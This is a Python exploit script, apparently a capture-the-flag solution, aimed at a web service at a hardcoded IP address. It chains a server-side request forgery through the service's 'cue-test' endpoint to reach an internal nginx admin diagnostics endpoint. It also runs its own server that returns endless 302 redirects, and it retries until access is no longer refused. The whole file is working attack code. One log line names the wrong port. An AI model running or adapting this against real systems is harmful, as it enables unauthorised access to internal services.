import json
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib import request, error
from urllib.parse import urlparse, parse_qs, urlencode

BASE_URL = "http://43.203.37.155"
REDIRECT_HOST = "http://132.145.90.226:8888"

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        if parsed.path != "/loop":
            self.send_response(404)
            self.end_headers()
            return
        qs = parse_qs(parsed.query)
        count = int(qs.get("count", ["0"])[0])
        next_count = count + 1
        print(f"[+] redirecting to /loop?count={next_count}")
        location = f"/loop?count={next_count}"
        self.send_response(302)
        self.send_header("Location", location)
        self.end_headers()

    def log_message(self, *_args):
        return


def start_redirect_server():
    server = HTTPServer(("0.0.0.0", 8888), RedirectHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def http_json(method, url, headers=None, body=None):
    headers = headers or {}
    data = None
    if body is not None:
        data = json.dumps(body).encode("utf-8")
        headers.setdefault("Content-Type", "application/json")
    req = request.Request(url, method=method, headers=headers, data=data)
    try:
        with request.urlopen(req, timeout=5) as resp:
            raw = resp.read().decode("utf-8")
            return resp.getcode(), resp.headers, raw
    except error.HTTPError as e:
        raw = e.read().decode("utf-8") if e.fp else ""
        return e.code, e.headers, raw


def register_ticket():
    status, headers, raw = http_json("GET", f"{BASE_URL}/register")
    if status != 200:
        raise RuntimeError(f"register failed: {status} {raw}")
    data = json.loads(raw)
    cookie = headers.get("Set-Cookie", "")
    return data["ticket"], cookie


def cue_test(outer_cookie, inner_ticket):
    body = {
        "url": "http://nginx/admin/diagnostics",
        "method": "POST",
        "headers": {
            "Cookie": f"ticket={inner_ticket}",
            "Content-Type": "application/json"
        },
        "body": {
            "ticket": inner_ticket,
            "url": f"{REDIRECT_HOST}/loop?count=0"
        }
    }
    headers = {"Cookie": outer_cookie}
    status, _headers, raw = http_json("POST", f"{BASE_URL}/user/cue-test", headers=headers, body=body)
    return status, raw


def main():
    server = start_redirect_server()
    print("[+] Redirect server started on :8000")

    outer_ticket, outer_cookie = register_ticket()
    print(f"[+] outer ticket: {outer_ticket}")

    for attempt in range(1, 10):
        inner_ticket, _inner_cookie = register_ticket()
        status, raw = cue_test(outer_cookie, inner_ticket)
        print(f"[+] attempt {attempt}: inner={inner_ticket} status={status} body={raw}")
        if status == 200:
            try:
                data = json.loads(raw)
                inner_status = data.get("status")
                print(f"    -> internal status: {inner_status}")
            except Exception:
                pass
        if status != 403:
            break

    server.shutdown()

if __name__ == "__main__":
    main()
